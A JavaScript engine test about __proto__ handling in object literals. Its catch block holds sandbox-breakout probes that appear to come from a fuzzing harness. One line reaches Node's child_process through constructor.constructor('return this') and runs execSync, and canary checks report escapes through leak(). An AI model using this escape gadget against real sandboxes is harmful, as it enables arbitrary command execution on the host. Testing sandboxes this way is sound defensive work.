try {
    var object;
    object = { __proto__: undefined };
    assert.sameValue(Object.getPrototypeOf(object), Object.prototype, 'prototype (undefined)');
    assert.sameValue(Object.getOwnPropertyDescriptor(object, '__proto__'), undefined, 'property (undefined)');
    object = { __proto__: 1 };
    assert.sameValue(Object.getPrototypeOf(object), Object.prototype, 'prototype (numeric primitive)');
    assert.sameValue(Object.getOwnPropertyDescriptor(object, '__proto__'), undefined, 'property (numeric primitive)');
    object = { __proto__: false };
    assert.sameValue(Object.getPrototypeOf(object), Object.prototype, 'prototype (boolean primitive)');
    assert.sameValue(Object.getOwnPropertyDescriptor(object, '__proto__'), undefined, 'property (boolean primitive)');
    object = { __proto__: 'string literal' };
    assert.sameValue(Object.getPrototypeOf(object), Object.prototype, 'prototype (string primitive)');
    assert.sameValue(Object.getOwnPropertyDescriptor(object, '__proto__'), undefined, 'property (string primitive)');
    object = { __proto__: Symbol('') };
    assert.sameValue(Object.getPrototypeOf(object), Object.prototype, 'prototype (symbol)');
    assert.sameValue(Object.getOwnPropertyDescriptor(object, '__proto__'), undefined, 'property (symbol)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}